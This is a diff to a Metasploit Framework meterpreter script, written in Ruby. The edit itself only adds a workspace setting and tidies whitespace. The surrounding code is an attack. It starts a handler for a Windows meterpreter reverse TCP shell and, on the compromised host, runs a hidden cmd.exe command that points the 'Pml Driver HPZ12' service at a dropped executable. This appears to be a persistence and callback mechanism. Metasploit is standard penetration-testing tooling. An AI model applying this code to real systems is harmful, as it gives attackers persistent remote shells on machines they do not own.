@@ -1,6 +1,6 @@
 # $Id$
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/projects/Framework/
@@ -83,9 +83,10 @@ client.sys.process.get_processes().each do |m|
 
 		# Our handler to recieve the callback.
 		handler = client.framework.exploits.create("multi/handler")
-		handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
-		handler.datastore['LHOST']   = rhost
-		handler.datastore['LPORT']   = rport
+		handler.datastore['WORKSPACE']     = client.workspace
+		handler.datastore['PAYLOAD']       = "windows/meterpreter/reverse_tcp"
+		handler.datastore['LHOST']         = rhost
+		handler.datastore['LPORT']         = rport
 		handler.datastore['ExitOnSession'] = false
 
 		handler.exploit_simple(
@@ -94,6 +95,7 @@ client.sys.process.get_processes().each do |m|
 		)
 
 		client.sys.process.execute("cmd.exe /c sc config \"Pml Driver HPZ12\" binpath= %SystemRoot%\\system32\\HPZipm12.exe", nil, {'Hidden' => 'true'})
-			
+
 	end
 end
+
